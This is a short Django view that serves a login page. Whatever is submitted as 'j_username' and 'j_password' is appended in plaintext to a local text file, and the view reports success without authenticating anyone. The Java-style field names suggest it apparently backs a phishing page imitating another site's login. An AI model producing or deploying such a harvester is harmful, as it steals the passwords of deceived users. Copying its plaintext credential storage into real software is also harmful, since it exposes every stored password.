from django.http import HttpResponse
from django.shortcuts import render
import os


def login_form(request):
    if request.method == "POST":
        # Handle form submission
        j_username = request.POST.get("j_username", "")
        j_password = request.POST.get("j_password", "")
        
        # Save the data to a text file
        with open("form_data.txt", "a") as file:
            file.write(f"Username: {j_username}, Password: {j_password}\n")
        
        # Return a response or redirect
        return HttpResponse("Form submitted successfully!")
    
    # Render the login.html page for GET requests
    return render(request, "auth_form/login.html")
